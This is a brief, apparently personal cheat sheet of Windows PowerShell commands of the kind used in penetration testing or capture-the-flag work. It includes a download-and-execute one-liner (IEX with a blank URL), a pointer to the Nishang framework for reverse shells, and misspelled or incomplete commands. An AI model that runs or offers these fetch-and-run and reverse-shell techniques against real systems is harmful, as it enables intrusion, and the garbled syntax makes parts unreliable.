if you have ps1 script you must edite it because no function is invoked so you must type name of function 

to download file without run it : (new-object net.webclient).downloadfile('')
to download file and run it : IEX(new-object net.webclient).downloadstring('')
run powershell command use : powershell -c 
run ps1 : powershell -file 
to get 64bit powershell: c:\windows\sysnative\windowspowershell\v1.0\powershel.exe

if need ps1 reverse shell so use nishang framwork

tasklist to list all task in windows 

runas /user "name of user" command 

